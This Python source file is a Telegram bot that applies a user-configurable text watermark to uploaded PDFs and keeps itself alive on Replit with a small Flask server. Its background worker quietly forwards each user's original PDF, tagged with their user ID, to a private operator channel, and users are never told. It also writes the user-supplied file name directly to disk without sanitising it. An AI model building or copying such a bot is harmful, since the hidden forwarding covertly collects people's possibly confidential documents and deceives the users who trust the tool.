import os
import json
import telebot
import time
from queue import Queue
from PyPDF2 import PdfReader, PdfWriter
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from flask import Flask
from threading import Thread

# 🔧 Replit Secret: BOT_TOKEN = your_bot_token
TOKEN = os.environ['BOT_TOKEN']
bot = telebot.TeleBot(TOKEN)

# 🔧 Replace with your private channel ID
CHANNEL_ID = "-1001234567890"

# Load & save user settings
SETTINGS_FILE = 'settings.json'
if os.path.exists(SETTINGS_FILE):
    with open(SETTINGS_FILE, 'r') as f:
        user_settings = json.load(f)
        user_settings = {int(k): v for k, v in user_settings.items()}
else:
    user_settings = {}

def save_settings():
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(user_settings, f)

# Watermark file queue
file_queue = Queue()

# ✅ Create watermark PDF
def create_watermark_pdf(user_id):
    settings = user_settings.get(user_id, {
        "text": "CONFIDENTIAL",
        "size": 40,
        "angle": 45,
        "color": "gray",
        "position": "center",
        "font": "Helvetica"
    })

    c = canvas.Canvas("watermark.pdf", pagesize=letter)
    c.setFont(settings["font"], settings["size"])

    if settings["color"] == "gray":
        c.setFillGray(0.5, 0.3)
    elif settings["color"] == "red":
        c.setFillColorRGB(1, 0, 0, alpha=0.3)
    elif settings["color"] == "blue":
        c.setFillColorRGB(0, 0, 1, alpha=0.3)
    else:
        c.setFillGray(0.5, 0.3)

    positions = {
        "top-left": (50, 750),
        "top-right": (500, 750),
        "center": (300, 400),
        "bottom-left": (50, 100),
        "bottom-right": (500, 100)
    }
    x, y = positions.get(settings["position"], (300, 400))

    c.saveState()
    c.translate(x, y)
    c.rotate(settings["angle"])
    c.drawCentredString(0, 0, settings["text"])
    c.restoreState()
    c.save()

# ✅ Apply watermark to all pages
def apply_watermark(input_file, output_file):
    reader = PdfReader(input_file)
    watermark = PdfReader("watermark.pdf").pages[0]
    writer = PdfWriter()

    for page in reader.pages:
        page.merge_page(watermark)
        writer.add_page(page)

    with open(output_file, 'wb') as f:
        writer.write(f)

# ✅ Background worker that processes the queue
def worker():
    while True:
        if not file_queue.empty():
            task = file_queue.get()
            user_id = task['user_id']
            message_id = task['message_id']
            file_name = task['file_name']
            downloaded_file = task['downloaded_file']

            try:
                # Save original file
                with open(file_name, 'wb') as f:
                    f.write(downloaded_file)

                bot.send_message(user_id, f"🖋️ Processing `{file_name}`...", parse_mode="Markdown")

                # Send original to private channel
                with open(file_name, 'rb') as f:
                    bot.send_document(CHANNEL_ID, f, caption=f"📥 From user ID: {user_id}")

                # Create watermark and apply
                create_watermark_pdf(user_id)
                output_pdf = f"watermarked_{file_name}"
                apply_watermark(file_name, output_pdf)

                with open(output_pdf, 'rb') as f:
                    bot.send_document(user_id, f)

                # Cleanup
                os.remove(file_name)
                os.remove(output_pdf)
                os.remove("watermark.pdf")

            except Exception as e:
                bot.send_message(user_id, f"❌ Error:\n`{e}`", parse_mode="Markdown")
            finally:
                file_queue.task_done()
        else:
            time.sleep(1)

# ✅ Start the worker thread
Thread(target=worker, daemon=True).start()

# ✅ Set watermark settings
@bot.message_handler(commands=['set_watermark'])
def set_watermark(message):
    user_id = message.chat.id
    args = message.text.replace('/set_watermark', '').strip()

    settings = user_settings.get(user_id, {
        "text": "CONFIDENTIAL",
        "size": 40,
        "angle": 45,
        "color": "gray",
        "position": "center",
        "font": "Helvetica"
    })

    for arg in args.split():
        if "=" in arg:
            key, value = arg.split("=")
            key = key.lower()
            value = value.strip()
            if key in settings:
                if key in ["size", "angle"]:
                    settings[key] = int(value)
                else:
                    settings[key] = value

    user_settings[user_id] = settings
    save_settings()

    bot.reply_to(message,
        f"✅ Watermark Set:\n"
        f"Text: {settings['text']}\n"
        f"Size: {settings['size']}\n"
        f"Angle: {settings['angle']}°\n"
        f"Color: {settings['color'].capitalize()}\n"
        f"Position: {settings['position'].replace('-', ' ').capitalize()}\n"
        f"Font: {settings['font']}"
    )

# ✅ Handle PDF uploads
@bot.message_handler(content_types=['document'])
def handle_pdf(message):
    user_id = message.chat.id

    if message.document.mime_type != "application/pdf":
        bot.reply_to(message, "⚠️ Please send a valid PDF file.")
        return

    if user_id not in user_settings:
        bot.reply_to(message, "⚠️ Use `/set_watermark` before uploading PDFs.", parse_mode="Markdown")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name
        downloaded_file = bot.download_file(file_info.file_path)

        # Add to queue
        file_queue.put({
            'user_id': user_id,
            'message_id': message.message_id,
            'file_name': file_name,
            'downloaded_file': downloaded_file
        })

        bot.send_message(user_id, f"📥 `{file_name}` received. Added to queue. Please wait...", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(user_id, f"❌ Download error:\n`{e}`", parse_mode="Markdown")

# ✅ Flask app to keep Replit alive
app = Flask('')
@app.route('/')
def home():
    return "Bot is alive."

def run():
    app.run(host='0.0.0.0', port=8080)

Thread(target=run).start()
bot.polling()
